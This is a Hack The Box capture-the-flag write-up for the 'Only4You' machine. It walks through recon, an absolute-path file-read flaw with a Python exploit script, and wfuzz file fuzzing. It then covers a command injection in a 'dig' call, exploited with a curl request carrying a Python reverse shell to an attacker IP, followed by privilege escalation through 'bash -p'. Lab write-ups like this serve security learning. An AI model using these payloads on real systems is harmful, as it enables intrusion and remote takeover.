---
title: "CTF Only For You"
date: 2023-05-14T11:01:52+01:00
tags:
    - CTF
category:
    - post
    - medium
keywords:
    - only for you
    - onlyforyou
    - hack the box
    - htb
comments: true
draft: false
---

## Investigation

First getting the lay of the land.
Lets start off with a scan of the box to see what services we are attacking.

`nmap -O 10.10.11.210 -sC -sV`

```bash
Starting Nmap 7.94 ( https://nmap.org ) at 2023-06-01 13:04 BST
Nmap scan report for only4you.htb (10.10.11.210)
Host is up (0.017s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e8:83:e0:a9:fd:43:df:38:19:8a:aa:35:43:84:11:ec (RSA)
|   256 83:f2:35:22:9b:03:86:0c:16:cf:b3:fa:9f:5a:cd:08 (ECDSA)
|_  256 44:5f:7a:a3:77:69:0a:77:78:9b:04:e0:9f:11:db:80 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Only4you
|_http-server-header: nginx/1.18.0 (Ubuntu)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94%E=4%D=6/1%OT=22%CT=1%CU=42825%PV=Y%DS=2%DC=I%G=Y%TM=6478894C
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=101%GCD=1%ISR=10F%TI=Z%CI=Z%II=I%TS=A)OPS(
OS:O1=M550ST11NW7%O2=M550ST11NW7%O3=M550NNT11NW7%O4=M550ST11NW7%O5=M550ST11
OS:NW7%O6=M550ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(
OS:R=Y%DF=Y%T=40%W=FAF0%O=M550NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS
OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=
OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=
OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T
OS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=
OS:S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.09 seconds
```

There is an http server and a ssh server. Requesting our domain results in a redirect to `http://only4you.htb` so I need to update my `/etc/hosts` with the domain
I would need credentials to attack the ssh server so I'm going to ignore it till later.

### only4you.htb

Lets see what our HTTP server responds with.
Using Link Gopher extension, we can extract every link on the home website.

```bash
links
http://beta.only4you.htb/
http://only4you.htb/
http://only4you.htb/#
http://only4you.htb/#about
http://only4you.htb/#contact
http://only4you.htb/#hero
http://only4you.htb/#services
http://only4you.htb/#team
https://bootstrapmade.com/

domains
http://beta.only4you.htb/
http://only4you.htb/
https://bootstrapmade.com/
```

beta.only4you.htb is very interesting and we are going to add it to our hosts file for later.

There also is a form which we can use. 
filling it out responds in a 302 html response.
This looks to be non functional on this website.
This might be something to try out later

time to investigate the beta site.

### beta.only4you.htb

This website immediately gives you the source code to the website.
Looking over it, `/download` immediately jumps out at me for an LFI.

```python
@app.route('/download', methods=['POST'])
def download():
    image = request.form['image']
    filename = posixpath.normpath(image)
    if '..' in filename or filename.startswith('../'):
        flash('Hacking detected!', 'danger')
        return redirect('/list')
    if not os.path.isabs(filename):
        filename = os.path.join(app.config['LIST_FOLDER'], filename)
    try:
        if not os.path.isfile(filename):
            flash('Image doesn\'t exist!', 'danger')
            return redirect('/list')
    except (TypeError, ValueError):
        raise BadRequest()
    return send_file(filename, as_attachment=True)
```

Reading though, it appears to have some prevention for basic LFI.
However, after some testing, it appears we can use the absolute path instead of a relative path to find files near the root of the file system.
```python
import os 
os.path.isabs("/etc/passwd")
```
using this knowledge, we can compose a payload which avoids the 1st and 2nd condition checks.
After some scripting and a little work, we have a basic LFI tool.

```python
#!/usr/bin/env python3

import requests
import sys


def lfi(file):
    url = "http://beta.only4you.htb/download"

    payload = {
        "image": file
    }

    r = requests.post(url, data=payload)
    return r.text


if __name__ == "__main__":
    file = sys.argv[1]
    print(lfi(file))
```

This works and we have a working LFI!

### LFI

Now that we have LFI, its time to find out information about the system.
Time for fuzzing!

I use a simple wordlist to find some of the useful files.

`wfuzz -z file,file_inclusion_linux.txt -d "image=/FUZZ" --hc 302 "http://beta
.only4you.htb/download"`

```bash
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://beta.only4you.htb/download
Total requests: 1226

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                       
=====================================================================

000000003:   200        280 L    969 W      9733 Ch     "/boot/grub/grub.cfg"                         
000000005:   200        88 L     467 W      3028 Ch     "/etc/adduser.conf"                           
000000065:   200        20 L     68 W       778 Ch      "/etc/dhcp/dhclient.conf"                     
000000062:   200        20 L     99 W       604 Ch      "/etc/deluser.conf"                           
000000061:   200        33 L     173 W      1421 Ch     "/etc/default/grub"                           
000000060:   200        1 L      1 W        13 Ch       "/etc/debian_version" 
...
```


After looking though the results, there are only a few files of interest.
Of interest is `/etc/nginx/sites-available/default` because it helps us work out the where the server code is.
```bash
server {
    listen 80;
    return 301 http://only4you.htb$request_uri;
}
server {
	listen 80;
	server_name only4you.htb;

	location / {
                include proxy_params;
                proxy_pass http://unix:/var/www/only4you.htb/only4you.sock;
	}
}
...
```
It looks like its using only4you.htb for the server name which is interesting.
Though some educated guesses, we can guess the service files.
 `/etc/systemd/system/only4you.service`
```bash
[Unit]
Description=Gunicorn instance for only4you
After=network.target

[Service]
User=www-data
Group=www-data
WorkingDirectory=/var/www/only4you.htb
ExecStart=/usr/bin/gunicorn --workers 3 --bind unix:only4you.sock -m 007 app:app

[Install]
WantedBy=multi-user.target
```

It looks to be a python server in `/var/www/only4you.htb/app.py`
I can test this by requesting the file.

### only4you.htb source code

```python 
from flask import Flask, render_template, request, flash, redirect
from form import sendmessage
import uuid

app = Flask(__name__)
app.secret_key = uuid.uuid4().hex
...
```

Looking though this file, we find nothing of interest. 
There is a strange import from something called form.
Trying to request form.py results in a much more interesting file  

```python
import smtplib, re
from email.message import EmailMessage
from subprocess import PIPE, run
import ipaddress

def issecure(email, ip):
	if not re.match("([A-Za-z0-9]+[.-_])*[A-Za-z0-9]+@[A-Za-z0-9-]+(\.[A-Z|a-z]{2,})", email):
		return 0
	else:
		domain = email.split("@", 1)[1]
		result = run([f"dig txt {domain}"], shell=True, stdout=PIPE)
		output = result.stdout.decode('utf-8')
		if "v=spf1" not in output:
			return 1
		else:
...
```

Importantly, this code appears to execute `dig txt {domain}`
The code does no form of sanitisation on this input which means its ideal for an RCE!

Starting a listener server with netcat `nc -lvnp 9001`, we start to make attempts.
No hits on using bash or nc for a reverse shell.
Attempting to spawn a shell using python works however!
Using curl we can easily spawn a shell session

```bash
 curl --location 'http://only4you.htb/' \
                                      --form 'email="fake@gmail.com && python3 -c 
'\''import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.90\",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")'\''"' \
                                      --form 'subject="test"' \
                                      --form 'message="test"'
```

Now that I have a reverse shell, i run linpeas to enumerate the system.

While enumerating, i find that `/bin/bash` has a privilege escalation vun.
running `bash -p`
This dropped me straight into root and I collected my flags.

## Post Comments

I don't believe my PVE exploit was intended as i bypassed a lot of the box. 
Furthermore, testing for this PVE after the box was reset, I couldn't find it again.

I might go back and attempt this box again because ended up not using a lot of the services such as:
- ssh
-  mysql
- neo4j

and it might be interesting to see how they they were involved.

Overall i found the box pretty simple and short. (probably due to unintentional solution)